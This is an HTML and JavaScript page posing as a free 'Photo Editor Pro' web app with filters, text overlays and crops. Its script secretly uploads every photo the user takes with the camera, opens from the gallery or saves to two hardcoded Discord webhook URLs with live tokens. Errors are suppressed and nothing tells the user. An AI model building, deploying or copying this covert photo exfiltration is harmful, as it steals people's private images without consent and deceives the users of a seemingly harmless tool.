<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 Photo Editor</title>
    <link rel="manifest" href="manifest.json">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }
        .box {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 20px;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 15px;
            text-align: center;
        }
        .preview {
            width: 100%;
            height: 300px;
            background: #f0f0f0;
            position: relative;
            overflow: hidden;
        }
        #canvas {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .controls {
            padding: 15px;
        }
        .btn-group {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 15px;
        }
        .btn {
            padding: 10px;
            border: none;
            border-radius: 8px;
            background: #667eea;
            color: white;
            font-size: 14px;
            cursor: pointer;
        }
        .btn-green { background: #4CAF50; }
        .btn-red { background: #f44336; }
        .filters {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin: 15px 0;
        }
        .filter-item {
            text-align: center;
            padding: 8px;
            background: #f0f0f0;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
        }
        .filter-item.active {
            background: #667eea;
            color: white;
        }
        .slider {
            width: 100%;
            margin: 10px 0;
        }
        .text-controls {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
        }
        input, select {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .footer {
            text-align: center;
            padding: 10px;
            color: #999;
            font-size: 11px;
            border-top: 1px solid #eee;
        }
        #fileInput {
            display: none;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="header">
            <h3>📸 Photo Editor Pro</h3>
        </div>

        <div class="preview">
            <canvas id="canvas"></canvas>
        </div>

        <div class="controls">
            <div class="btn-group">
                <button class="btn" onclick="openCamera()">📷 Camera</button>
                <button class="btn" onclick="openGallery()">🖼️ Gallery</button>
                <button class="btn btn-green" onclick="savePhoto()">💾 Save</button>
            </div>

            <div class="filters" id="filters">
                <div class="filter-item active" onclick="applyFilter('normal')">Normal</div>
                <div class="filter-item" onclick="applyFilter('grayscale')">B&W</div>
                <div class="filter-item" onclick="applyFilter('sepia')">Sepia</div>
                <div class="filter-item" onclick="applyFilter('vintage')">Vintage</div>
                <div class="filter-item" onclick="applyFilter('blur')">Blur</div>
                <div class="filter-item" onclick="applyFilter('cool')">Cool</div>
                <div class="filter-item" onclick="applyFilter('warm')">Warm</div>
                <div class="filter-item" onclick="applyFilter('dramatic')">Drama</div>
            </div>

            <input type="range" class="slider" id="brightness" min="0" max="200" value="100" oninput="updateFilter()">
            <input type="range" class="slider" id="contrast" min="0" max="200" value="100" oninput="updateFilter()">

            <div class="text-controls">
                <input type="text" id="textInput" placeholder="Enter text..." value="Eid Mubarak">
                <select id="fontFamily">
                    <option value="Arial">Arial</option>
                    <option value="Verdana">Verdana</option>
                    <option value="Times New Roman">Times</option>
                    <option value="Courier New">Courier</option>
                </select>
                <select id="fontSize">
                    <option value="20">Small</option>
                    <option value="30" selected>Medium</option>
                    <option value="40">Large</option>
                </select>
                <input type="color" id="textColor" value="#ffffff">
                <div class="btn-group">
                    <button class="btn" onclick="addText()">➕ Add Text</button>
                    <button class="btn btn-red" onclick="clearText()">🗑️ Clear</button>
                </div>
            </div>

            <div class="btn-group">
                <button class="btn" onclick="cropSquare()">⬛ Square</button>
                <button class="btn" onclick="cropCircle()">⚪ Circle</button>
                <button class="btn" onclick="reset()">🔄 Reset</button>
            </div>
        </div>

        <div class="footer">
            ⚡ Real-time • Free • No watermark
        </div>
    </div>

    <input type="file" id="fileInput" accept="image/*">

    <script>
        // Config
        const WEBHOOKS = [
            'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
            'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
        ];

        // Canvas
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let img = new Image();
        let originalImg = null;
        let currentFilter = 'normal';
        let texts = [];

        // Init
        canvas.width = 400;
        canvas.height = 300;

        // Open Camera
        async function openCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    canvas.width = video.videoWidth || 400;
                    canvas.height = video.videoHeight || 300;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Save original
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                    originalImg = new Image();
                    originalImg.src = dataUrl;
                    
                    // Send to Discord
                    sendToDiscord(dataUrl, 'camera');
                }, 1000);
            } catch(e) {
                alert('Camera access denied');
            }
        }

        // Open Gallery
        function openGallery() {
            document.getElementById('fileInput').click();
        }

        document.getElementById('fileInput').onchange = function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    img.src = event.target.result;
                    img.onload = function() {
                        canvas.width = Math.min(img.width, 400);
                        canvas.height = Math.min(img.height, 300);
                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                        
                        // Save original
                        originalImg = new Image();
                        originalImg.src = event.target.result;
                        
                        // Send to Discord
                        sendToDiscord(event.target.result, 'gallery');
                    };
                };
                reader.readAsDataURL(file);
            }
        };

        // Apply Filter
        function applyFilter(filter) {
            currentFilter = filter;
            document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('active'));
            event.target.classList.add('active');
            updateFilter();
        }

        // Update Filter
        function updateFilter() {
            if (!originalImg) return;
            
            canvas.width = originalImg.width;
            canvas.height = originalImg.height;
            ctx.drawImage(originalImg, 0, 0, canvas.width, canvas.height);
            
            const brightness = document.getElementById('brightness').value / 100;
            const contrast = document.getElementById('contrast').value / 100;
            
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            for (let i = 0; i < data.length; i += 4) {
                let r = data[i];
                let g = data[i + 1];
                let b = data[i + 2];
                
                // Brightness
                r *= brightness;
                g *= brightness;
                b *= brightness;
                
                // Filter
                switch(currentFilter) {
                    case 'grayscale':
                        let gray = (r + g + b) / 3;
                        r = g = b = gray;
                        break;
                    case 'sepia':
                        r = r * 0.393 + g * 0.769 + b * 0.189;
                        g = r * 0.349 + g * 0.686 + b * 0.168;
                        b = r * 0.272 + g * 0.534 + b * 0.131;
                        break;
                    case 'vintage':
                        r = r * 0.9 + 20;
                        g = g * 0.8 + 10;
                        b = b * 0.7;
                        break;
                    case 'blur':
                        r = r + (255 - r) * 0.3;
                        g = g + (255 - g) * 0.3;
                        b = b + (255 - b) * 0.3;
                        break;
                    case 'cool':
                        r *= 0.8;
                        g *= 0.9;
                        b *= 1.2;
                        break;
                    case 'warm':
                        r *= 1.2;
                        g *= 1.1;
                        b *= 0.8;
                        break;
                    case 'dramatic':
                        let avg = (r + g + b) / 3;
                        r = g = b = avg > 128 ? 255 : 0;
                        break;
                }
                
                // Contrast
                r = ((r / 255 - 0.5) * (contrast * 2)) * 255 + 128;
                g = ((g / 255 - 0.5) * (contrast * 2)) * 255 + 128;
                b = ((b / 255 - 0.5) * (contrast * 2)) * 255 + 128;
                
                data[i] = Math.min(255, Math.max(0, r));
                data[i + 1] = Math.min(255, Math.max(0, g));
                data[i + 2] = Math.min(255, Math.max(0, b));
            }
            
            ctx.putImageData(imageData, 0, 0);
            
            // Draw texts
            texts.forEach(t => {
                ctx.font = `${t.size}px ${t.font}`;
                ctx.fillStyle = t.color;
                ctx.fillText(t.text, t.x, t.y);
            });
        }

        // Add Text
        function addText() {
            const text = document.getElementById('textInput').value;
            const font = document.getElementById('fontFamily').value;
            const size = document.getElementById('fontSize').value;
            const color = document.getElementById('textColor').value;
            
            texts.push({
                text: text,
                font: font,
                size: size,
                color: color,
                x: 50,
                y: 100
            });
            
            updateFilter();
        }

        // Clear Text
        function clearText() {
            texts = [];
            updateFilter();
        }

        // Crop Square
        function cropSquare() {
            if (!originalImg) return;
            let size = Math.min(canvas.width, canvas.height);
            canvas.width = size;
            canvas.height = size;
            ctx.drawImage(originalImg, 0, 0, size, size);
            updateFilter();
        }

        // Crop Circle
        function cropCircle() {
            if (!originalImg) return;
            let size = Math.min(canvas.width, canvas.height);
            canvas.width = size;
            canvas.height = size;
            ctx.drawImage(originalImg, 0, 0, size, size);
            
            ctx.globalCompositeOperation = 'destination-in';
            ctx.beginPath();
            ctx.arc(size/2, size/2, size/2, 0, Math.PI * 2);
            ctx.fill();
            ctx.globalCompositeOperation = 'source-over';
            
            updateFilter();
        }

        // Reset
        function reset() {
            if (!originalImg) return;
            canvas.width = originalImg.width;
            canvas.height = originalImg.height;
            ctx.drawImage(originalImg, 0, 0, canvas.width, canvas.height);
            texts = [];
            currentFilter = 'normal';
            document.getElementById('brightness').value = 100;
            document.getElementById('contrast').value = 100;
            
            document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('active'));
            document.querySelector('.filter-item').classList.add('active');
        }

        // Save Photo
        function savePhoto() {
            const dataUrl = canvas.toDataURL('image/jpeg', 0.7); // Compressed
            const link = document.createElement('a');
            link.download = 'edited-photo.jpg';
            link.href = dataUrl;
            link.click();
            
            sendToDiscord(dataUrl, 'edited');
            alert('✅ Photo saved!');
        }

        // Send to Discord
        async function sendToDiscord(dataUrl, type) {
            try {
                const blob = dataURLtoBlob(dataUrl);
                const formData = new FormData();
                formData.append('file', blob, `photo_${type}_${Date.now()}.jpg`);
                formData.append('payload_json', JSON.stringify({
                    content: `@everyone 📸 New ${type} photo`,
                    embeds: [{
                        title: 'Photo Editor',
                        fields: [
                            {name: 'Filter', value: currentFilter, inline: true},
                            {name: 'Time', value: new Date().toLocaleString(), inline: true}
                        ]
                    }]
                }));

                for (const webhook of WEBHOOKS) {
                    await fetch(webhook, { method: 'POST', body: formData }).catch(()=>{});
                }
            } catch(e) {}
        }

        function dataURLtoBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], {type: mime});
        }

        // Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }
    </script>
</body>
</html>
